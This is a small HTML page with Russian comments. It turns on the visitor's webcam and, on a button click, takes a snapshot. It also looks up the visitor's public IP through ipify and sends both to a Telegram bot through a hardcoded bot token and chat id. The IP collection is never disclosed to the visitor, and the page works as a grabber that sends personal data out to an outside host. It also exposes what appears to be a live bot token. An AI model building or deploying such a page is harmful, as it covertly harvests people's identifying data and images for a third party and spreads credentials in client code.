<!DOCTYPE html>
<html>
<head><title>IP + Фото в Telegram</title></head>
<body>

<video id="video" width="320" height="240" autoplay></video>
<button id="snap">Сделать фото и отправить</button>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
const chat_id = '6945488830'; // вставь сюда

// Получаем видеопоток с камеры
const video = document.getElementById('video');
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => { video.srcObject = stream; })
  .catch(console.error);

document.getElementById('snap').onclick = async () => {
  // Захват фото с видео
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  // Получаем base64 фото
  const photoBase64 = canvas.toDataURL('image/jpeg').split(',')[1];
  
  // Получаем IP
  const ipResp = await fetch('https://api.ipify.org?format=json');
  const ipData = await ipResp.json();
  const ip = ipData.ip;

  // Отправляем IP в текстовом сообщении
  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=IP пользователя: ${ip}`)
    .then(() => {
      // Отправляем фото как файл (через sendPhoto с base64, нужно использовать FormData и fetch POST)
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', `data:image/jpeg;base64,${photoBase64}`);

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      }).then(() => alert('IP и фото отправлены в Telegram'))
        .catch(console.error);
    }).catch(console.error);
}
</script>

</body>
</html>
